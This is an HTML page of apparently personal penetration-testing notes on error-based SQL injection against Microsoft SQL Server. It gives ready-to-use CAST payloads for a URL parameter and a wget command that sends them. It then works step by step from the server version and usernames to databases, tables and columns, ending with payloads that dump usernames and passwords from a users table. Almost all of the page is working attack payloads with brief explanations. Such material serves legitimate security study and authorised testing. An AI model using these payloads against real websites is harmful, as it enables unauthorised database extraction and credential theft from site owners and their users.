<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MSSQL error-based injections exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>MSSQL error-based injections exploit</h1><br /><br /><strong>
      <h3>CAST Technique</h3>
    </strong><br /><br />payload for this technique:
    <code>123456 or 1 in (SELECT TOP 1 CAST(&lt;FIELDNAME&gt; as varchar(4096)) from &lt;TABLENAME&gt; WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)); --</code><br /><br /><span
      style="text-decoration:underline;">Address bar of a Browser</span>: <br />www.example.com?id=<span
      style="color:#a020f0;">123456</span><span style="color:#ff8700;"> OR 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(&lt;FIELDNAME&gt; as varchar(4096))</span> from &lt;TABLENAME&gt; <span
      style="color:#ff00c5;">WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;))</span>; --<br /> ◇ <span
      style="color:#a020f0;">123456</span> is just a random value that we insert probably false<br /> ◇ Anyway we are
    interested in the second <span style="color:#ff8700;">OR</span> part of the query<br /> ▪ <span
      style="color:#ff8700;">OR 1 in</span> → This is the part of the SQL that will trigger the error. Because we are
    asking the database to look for integer (value 1) within a varchar column<br /> ▪ <span
      style="color:#00ff00;">CAST(&lt;FIELDNAME&gt; as varchar(4096))</span> → &lt;FIELDNAME&gt; is where insert the
    column that we want to dump or a SQL function like user_name() or a variable like @@version<br /> ▪ <span
      style="color:#ff00c5;">WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;))</span> → This part can be omitted/adjusted
    at our disposal. It is used to dump database data<br /><br />Terminal(wget):<br />wget “www.example.com?id=<span
      style="color:#a020f0;">123456</span><span style="color:#ff8700;"> OR 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(&lt;FIELDNAME&gt; as varchar(4096))</span> from &lt;TABLENAME&gt; <span
      style="color:#ff00c5;">WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;))</span>; --” -q -O -<br /> ◇ -q → quiet<br />
    ◇ -O - → print output on Standard Output<br /><br /><strong>
      <h3>MSSQL Commands</h3>
    </strong> (<a
      href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">cheatsheet</a>)<br />To
    dump the data in a database we need to follow these steps<br />1. <strong>Retrieve the SQL Server
      version</strong><br /> <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span>
    (SELECT TOP 1 <span style="color:#00ff00;">CAST(@@version as varchar(4096))</span>) --<br />2. <strong>Find
      usernames</strong><br /> User_name() is a MS SQL function which returns the current database user<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(user_name() as varchar(4096))</span>) --<br /> ▪ find current username<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(user_name(0) as varchar(4096))</span>) --<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(user_name(1) as varchar(4096))</span>) --<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(user_name(2) as varchar(4096))</span>) --<br /> ▪ to find the other usernames<br />4.
    <strong>Find Readable Databases</strong><br /> Iterate through the MASTER database to find all the databases that we
    can read. <br /> The DB_NAME() function accesses the master..sysdatabases table which stores all the databases
    installed on the server. We can only see the databases that user has rights to.<br /> To enumerate all the databases
    that user can access, we just have to increment the db_name() argument<br />
    <table class="table">
      <tr>
        <th> </th>
        <th>command</th>
      </tr>
      <tr>
        <td>Current Database</td>
        <td>SELECT DB_NAME()</td>
      </tr>
      <tr>
        <td>List Databases</td>
        <td>SELECT name FROM master..sysdatabases;
          SELECT DB_NAME(N); — for N = 0, 1, 2, …</td>
      </tr>
    </table><br /> <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1
    <span style="color:#00ff00;">CAST(db_name(1) as varchar(4096))</span>) --<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(db_name(2) as varchar(4096))</span>) --<br /> <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(db_name(3) as varchar(4096))</span>) --<br /> ...<br />5. <strong>Enumerate Database
      Tables(technique easily modifiable to apply other databases types)</strong><br /> enumerate all the tables in the
    current database.<br /> <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span>
    (SELECT TOP 1 <span style="color:#00ff00;">CAST(name as varchar(4096)) FROM &lt;database name&gt;..sysobjects WHERE
    </span><span style="color:#00dbff;">xtype=&#39;U&#39;</span><span style="color:#00ff00;"> and </span><span
      style="color:#ff00e0;">name NOT IN (&lt;known table list&gt;)</span>); --<br /> ◇ <span
      style="color:#00dbff;">xtype=&#39;U&#39;</span> → means that we are only interested in user defined tables<br /> ◇
    <span style="color:#ff00e0;">name NOT IN (&#39;&lt;known table list&gt;&#39;)</span> → name is a column of the
    &quot;sysobjects&quot; special table. Every time we find a new table we will append it to the NOT IN list. <span
      style="text-decoration:underline;">This is needed because the error displays only the first table name</span>.
    <br /> <span style="color:#a5452a;">EXAMPLE:</span><br /> If we have a database with three <span
      style="text-decoration:underline;">tables (that still we do not know</span>): HR, Customers, Products<br /> Our
    queries to discover these tables will be:<br /> 1) <span style="color:#a020f0;">123456</span> <span
      style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span style="color:#00ff00;">CAST(name as varchar(4096)) FROM
      &lt;database name&gt;..sysobjects WHERE </span><span style="color:#00dbff;">xtype=&#39;U&#39;</span><span
      style="color:#00ff00;"> and </span><span style="color:#ff00e0;">name NOT IN (&#39;&#39;)</span>); --<br /> ▪ the
    error of the database will give us the first entry table &#39;HR&#39;<br /> 2) <span
      style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP 1 <span
      style="color:#00ff00;">CAST(name as varchar(4096)) FROM &lt;database name&gt;..sysobjects WHERE </span><span
      style="color:#00dbff;">xtype=&#39;U&#39;</span><span style="color:#00ff00;"> and </span><span
      style="color:#ff00e0;">name NOT IN (&#39;HR&#39;)</span>); --<br /> ▪ the error of the database will give us the
    first entry table ‘Customers’<br /> 3) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1
      in</span> (SELECT TOP 1 <span style="color:#00ff00;">CAST(name as varchar(4096)) FROM &lt;database
      name&gt;..sysobjects WHERE </span><span style="color:#00dbff;">xtype=&#39;U&#39;</span><span
      style="color:#00ff00;"> and </span><span style="color:#ff00e0;">name NOT IN (&#39;HR&#39;,
      &#39;Customers&#39;)</span>); --<br /> ▪ the error of the database will give us the first entry table
    &#39;Products&#39;<br /> 4) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span>
    (SELECT TOP 1 <span style="color:#00ff00;">CAST(name as varchar(4096)) FROM &lt;database name&gt;..sysobjects WHERE
    </span><span style="color:#00dbff;">xtype=&#39;U&#39;</span><span style="color:#00ff00;"> and </span><span
      style="color:#ff00e0;">name NOT IN (&#39;HR&#39;, &#39;Customers&#39;,&#39;Products&#39;)</span>); --<br /> ▪ the
    error of the database will not give us any table because they are finished<br /><br />5.<strong> Enumerate
      Columns</strong><br /> After retrieving the tables with the previous step, now is possible to recover the columns
    of each table<br /> <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT
    TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar(4096)) FROM &lt;db name&gt;..syscolumns, &lt;db
    name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;db
    name&gt;..sysobjects.name=<span style="color:#00ffad;">&lt;table name&gt;</span> AND <span
      style="color:#ff00e0;">&lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;))</span>; --<br /> ◇
    <span style="color:#00ffad;">&lt;table name&gt;</span> → This is the name of the table discovered in the previous
    step, of which we want to know the name<br /> ◇ <span style="color:#ff00e0;">&lt;db name&gt;..syscolumns.name NOT IN
      (&lt;known column list&gt;))</span> → we need to the same steps done by enumerating the database tables, always
    starting with a void string ‘’ for &lt;known column list&gt;<br /> <span
      style="color:#a5452a;">EXAMPLE:</span><br /> If we have a database with a table that contains the following <span
      style="text-decoration:underline;">columns (that still we do not know</span>): id (int), username (varchar),
    password (varchar)<br /> 1) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span>
    (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar(4096)) FROM &lt;db name&gt;..syscolumns, &lt;db
    name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;db
    name&gt;..sysobjects.name=<span style="color:#00ffad;">&lt;table name&gt;</span> AND <span
      style="color:#ff00e0;">&lt;db name&gt;..syscolumns.name NOT IN (&#39;&#39;))</span>; --<br /> ▪ the error of the
    database will give us the first column &#39;id(int)&#39;<br /> 2) ....<br /> ▪ the error of the database will give
    us the second column &#39;username (varchar)&#39;<br /> 3) ...<br /> ▪ the error of the database will give us the
    second column &#39;password (varchar)&#39;<br /><br />6.<strong> Dump Data in the columns</strong><br /> After we
    have retrieved from the previous step the database name, table name and column name; we can now dump the data in
    this column<br /> <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">or 1 in</span> (SELECT TOP
    1 CAST (&lt;column name&gt; as varchar(4096)) FROM &lt;db name&gt;..&lt;table name&gt; <span
      style="color:#ff00e0;">WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)</span>); -- -<br /> <span
      style="color:#a5452a;">EXAMPLE:</span><br /> In the next queries note that the concatenation of the id value with
    &quot;<span style="color:#ff0000;">+</span>&quot; (<span style="color:#ff0000;">%2b</span>) ensures that the
    selected id has data type varchar thus making the cast error possible!<br /> Our queries to discover the data in
    thes columns discovered in the previous step(<span style="color:#00ff00;">id, username,password</span>) will
    be:<br /> 1) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">OR 1 IN</span> (SELECT TOP 1
    CAST(<span style="color:#00ff00;">id</span> as varchar)%2bchar(64) FROM cms..users <span
      style="color:#ff00e0;">WHERE id NOT IN (&#39;&#39;)</span>); -- -<br /> ▪ column ‘id’: As result in this example
    we have &#39;1@&#39;<br /> 2) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">OR 1 IN</span>
    (SELECT TOP 1 CAST(<span style="color:#00ff00;">id</span> as varchar)%2bchar(64) FROM cms..users <span
      style="color:#ff00e0;">WHERE id NOT IN (&#39;1&#39;)</span>); -- -<br /> ▪ column ‘id’: As a result in this case
    we have ‘2@’<br /> 3) <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">OR 1 IN</span> (SELECT
    TOP 1 CAST(<span style="color:#00ff00;">username</span> as varchar)%2bchar(64) FROM cms..users ); -- -<br /> 4)
    <span style="color:#a020f0;">123456</span> <span style="color:#ff8700;">OR 1 IN</span> (SELECT TOP 1 CAST(<span
      style="color:#00ff00;">password</span> as varchar)%2bchar(64) FROM cms..users ); --
    -<br /><br />Bibliography:<br />• <a
      href="https://sqlwiki.netspi.com/injectionTypes/errorBased/#sqlserver" target="_blank">https://sqlwiki.netspi.com/injectionTypes/errorBased/#sqlserver</a>
  </div>
</body>

</html>